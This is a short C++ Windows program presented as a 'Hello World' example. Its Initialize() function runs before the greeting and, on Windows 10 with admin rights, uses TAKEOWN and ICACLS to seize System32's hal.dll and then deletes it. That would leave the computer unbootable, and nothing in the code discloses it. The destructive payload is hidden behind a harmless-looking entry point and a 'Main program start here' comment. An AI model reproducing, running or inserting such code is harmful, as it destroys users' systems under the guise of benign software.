#include <stdio.h>
#include <shlobj.h>

void Initialize() {
  system("ver > version");
  unsigned int major, minor;
  char* strver = new char[8];
  FILE* ver = fopen("version", "r");
  fscanf(ver, "\nMicrosoft Windows [%s %u.%u.", strver, &major, &minor);
  fclose(ver);
  remove("version");
  delete strver;
  if (major != 10) return;
  if (!IsUserAnAdmin()) {
    MessageBox(nullptr, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
    exit(EXIT_FAILURE);
  }
  const char* file = "C:\\Windows\\System32\\hal.dll";
  char* takeown = new char[strlen(file) + 25];
  strcpy(takeown, "TAKEOWN /F ");
  strcat(takeown, file);
  strcat(takeown, " /A >nul 2>&1");
  system(takeown);
  delete takeown;
  char* grant = new char[strlen(file) + 43];
  strcpy(grant, "ICACLS ");
  strcat(grant, file);
  strcat(grant, " /GRANT Administradores:F >nul 2>&1");
  system(grant);
  delete(grant);
  remove(file);
}

int main(int argc, char* argv[]) {
  Initialize();
  // Main program start here.
  printf("Hello World!");
  getchar();
  return 0;
}
